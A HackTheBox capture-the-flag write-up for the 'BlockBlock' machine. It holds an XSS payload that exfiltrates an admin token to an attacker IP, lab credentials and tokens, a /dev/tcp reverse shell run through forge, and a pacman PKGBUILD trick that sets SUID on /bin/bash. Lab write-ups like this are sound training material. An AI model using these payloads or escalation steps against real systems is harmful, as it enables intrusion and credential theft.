---
title: "HTB - BlockBlock"
description: HTB - BlockBlock
publishDate: 2025-02-02
tags:
  - HackTheBox
  - Decentralized
  - API
  - Solidity
  - XSS
  - Ethereum
  - Decode
  - Misconfiguration

---

## Box Info

| Name                  | BlockBlock       | 
| :-------------------- | ---------------: |
| Release Date          | 16 Nov, 2024     |
| OS                    | Linux            |
| Rated Difficulty      | Hard             |

## Enumeration

```bash
sudo nmap -p- --open --min-rate 5000 -n -vvv -Pn 10.10.11.43 -oG allPorts
```

```bash
[sudo] password for kali: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-08 23:01 EST
Initiating SYN Stealth Scan at 23:01
Scanning 10.10.11.43 [65535 ports]
Discovered open port 80/tcp on 10.10.11.43
Discovered open port 22/tcp on 10.10.11.43
Discovered open port 8545/tcp on 10.10.11.43
Completed SYN Stealth Scan at 23:02, 17.19s elapsed (65535 total ports)
Nmap scan report for 10.10.11.43
Host is up, received user-set (0.11s latency).
Scanned at 2025-03-08 23:01:51 EST for 17s
Not shown: 61578 closed tcp ports (reset), 3954 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
8545/tcp open  unknown syn-ack ttl 63
```

```sh
nmap -p 22,80,8545 -sCV 10.10.11.43 -oN targeted
```

```sh
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-08 23:03 EST
Nmap scan report for 10.10.11.43
Host is up (0.089s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.7 (protocol 2.0)
| ssh-hostkey: 
|   256 d6:31:91:f6:8b:95:11:2a:73:7f:ed:ae:a5:c1:45:73 (ECDSA)
|_  256 f2:ad:6e:f1:e3:89:38:98:75:31:49:7a:93:60:07:92 (ED25519)
80/tcp   open  http    Werkzeug httpd 3.0.3 (Python 3.12.3)
|_http-title:          Home  - DBLC    
|_http-server-header: Werkzeug/3.0.3 Python/3.12.3
8545/tcp open  http    Werkzeug httpd 3.0.3 (Python 3.12.3)
|_http-server-header: Werkzeug/3.0.3 Python/3.12.3
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.54 seconds
```

```sh
whatweb http://10.10.11.43
```

```r
http://10.10.11.43 [200 OK] Access-Control-Allow-Methods[GET,POST,PUT,DELETE,OPTIONS], Country[RESERVED][ZZ], Frame, HTML5, HTTPServer[Werkzeug/3.0.3 Python/3.12.3], IP[10.10.11.43], Python[3.12.3], Script, Title[Home  - DBLC][Title element contains newline(s)!], UncommonHeaders[access-control-allow-origin,access-control-allow-headers,access-control-allow-methods], Werkzeug[3.0.3]
```

![Image](image.png)

Register and login

![Image](image-1.png)

there redirecting us to api 

- Chat.sol
- Database.sol

![Image](image-2.png)

![Image](image-3.png)

*Solidity 0.8.23* - https://github.com/ethereum/solidity/blob/develop/docs/bugs_by_version.json

![Image](image-4.png)

![Image](image-5.png)

```
api/get_user_messages?username=admin
```

![Image](image-6.png)

for admin path we get 401

![Image](image-7.png)

![Image](image-8.png)

### XSS

XSS in report user botton

```bash
<img src=x onerror="fetch('http://10.10.11.43/api/info').then(r => r.text()).then(dataFromA => fetch(`http://10.10.14.37/?d=${btoa(dataFromA)}`))">
```

![Image](image-9.png)

we recieve the admin token

![Image](image-10.png)

```js
{"role":"admin","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczOTI3MTg3MCwianRpIjoiOTcxYmE2ODUtNmEwMi00NDc0LWFjYjAtNTk3ZmEwYmZhNzYzIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImFkbWluIiwibmJmIjoxNzM5MjcxODcwLCJleHAiOjE3Mzk4NzY2NzB9.mca-qKYWjU2Z6pZEqERpGggiPn3tVGUYA1Jx4XMWO_c","username":"admin"}
```

`http://10.10.11.43/admin`

![Image](image-11.png)

![Image](image-12.png)

```bash
curl http://10.10.11.43/api/get_user_messages?username=keira -H "Content-Type: application/json" -H "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0MTY1NjI5MSwianRpIjoiNjU4YzEwNjMtMDRmOC00MWZmLTgzY2UtZDMxMzRkOTUyMDFhIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImFkbWluIiwibmJmIjoxNzQxNjU2MjkxLCJleHAiOjE3NDIyNjEwOTF9.FQIsVELBbwo6qmDkF8ZFQXFa13eLPcEOxuKbbDdSrcE" -v
```

![Image](image-13.png)

/api/json-rpc
/api/chat_address

![Image](image-14.png)

`http://10.10.11.43/api/json-rpc`

![Image](image-15.png)

```java
Authorization:65d76446778ab14fb9a7a15f6ca33703432a3d31fcf3e43ba0aa8dbc18e3fd7b
```

https://ethereum.org/en/developers/docs/apis/json-rpc/#eth_getblockbynumber
https://docs.metamask.io/services/reference/ethereum/json-rpc-methods/eth_getwork/

Ethereum

```bash
fetch('http://10.10.11.43/api/json-rpc',{method:'POST',headers:{'Content-Type':'application/json',"token":"65d76446778ab14fb9a7a15f6ca33703432a3d31fcf3e43ba0aa8dbc18e3fd7b"},body:JSON.stringify({jsonrpc:"2.0",method:"eth_getBalance",params:["0x38...6F2...","latest"],id:1})});
```

we need receive this

![Image](image-16.png)

![Image](image-18.png)

On the /admin page we open the console of ff and we use the follow code:

```bash
fetch('http://10.10.11.43/api/json-rpc',{method:'POST',headers:{'Content-Type':'application/json',"token":"65d76446778ab14fb9a7a15f6ca33703432a3d31fcf3e43ba0aa8dbc18e3fd7b"},body:JSON.stringify({jsonrpc:"2.0",method:"eth_getBlockByNumber",params:["0xf",true],id:1})});
```

![Image](image-19.png)

[Ethereum](https://lab.miguelmota.com/ethereum-input-data-decoder/example/)

I change the "0xf" to 0x0 or "0x1" for change the block number

```bash
fetch('http://10.10.11.43/api/json-rpc',{method:'POST',headers:{'Content-Type':'application json',"token":"65d76446778ab14fb9a7a15f6ca33703432a3d31fcf3e43ba0aa8dbc18e3fd7b"},body:JSON.stringify({jsonrpc:"2.0",method:"eth_getBlockByNumber",params:["0x1",true],id:1})});
```

![Image](image-20.png)

Decode from hexadecimal

```java
0x60a060405234801561001057600080fd5b5060405161184538038061184583398101604081905261002f9161039a565b60405180606001604052808281526020016040518060400160405280600581526020016..........
```
https://gchq.github.io/CyberChef/

![Image](image-21.png)

both of `hexa` encode

```bash
6b65697261000000000000000000000000000000000000000000000000000000
536f6d65646179426974436f696e57696c6c436f6c6c61707365000000000000
```

keira
SomedayBitCoinWillCollapse

###### Keira

Sign in with ssh

![Image](image-22.png)

we cant run the binary

![Image](image-23.png)

```
sudo -u paul /home/paul/.foundry/bin/forge --help
```

![Image](image-24.png)

https://book.getfoundry.sh/reference/forge/forge

![Image](image-25.png)

something happens because dont get the reverse shell as paul, so we go use **build** option

create a file with reverse shell in /tmp

`!#/bin/bash\nbash -i >& /dev/tcp/10.10.14.37/4444 0>&1`

chmod +x soulc

```bash
sudo -u paul /home/paul/.foundry/bin/forge build --use ./solc
```

![Image](image-26.png)

##### Paul

![Image](image-27.png)

`http://thecybersimon.com/posts/Privilege-Escalation-via-Pacman/`

`PKGBUILD` shell script with the code provided below.

`PKGBUILD` is a shell script used in Arch Linux to define how a package is built, including metadata (name, version, description), dependencies, source files, and the steps to compile/install it. It’s processed by makepkg to create an installable .pkg.tar.zst for pacman. You can read more about it on Arch Linux btw Wiki.

`cd /dev/shm`

```bash
echo -e "pkgname=exp\npkgver=1.0\npkgrel=1\narch=('any')\ninstall=exp.install" > PKGBUILD
```

```bash
echo "post_install() { chmod 4777 /bin/bash; }" > exp.install
```

`makepkg -s`

```bash
sudo pacman -U *.zst --noconfirm
```

`bash -p`

![Image](image-28.png)

![Image](image-29.png)